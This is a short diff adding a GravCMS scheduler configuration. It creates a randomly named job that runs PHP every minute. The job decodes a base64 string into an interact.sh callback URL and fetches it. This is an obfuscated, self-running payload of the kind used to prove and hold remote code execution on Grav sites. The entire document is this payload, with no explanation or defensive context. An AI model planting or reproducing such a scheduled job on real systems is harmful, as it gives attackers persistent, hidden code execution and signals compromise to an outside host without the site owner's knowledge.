@@ -1,0 +1,9 @@
+title: GravCMS
+custom_jobs:
+  xvhxsk:
+    command: /usr/bin/php
+    args: '-r file_get_contents(base64_decode("aHR0cDovL3duNnNhdnlnYnUuZzE1ODM0MDMwMDhrNGkzODl0NGs3NWYyZnY2N3I4ZDJuLmludGVyYWN0LnNo"));'
+    at: '* * * * *'
+    output_mode: overwrite
+status:
+  xvhxsk: enabled
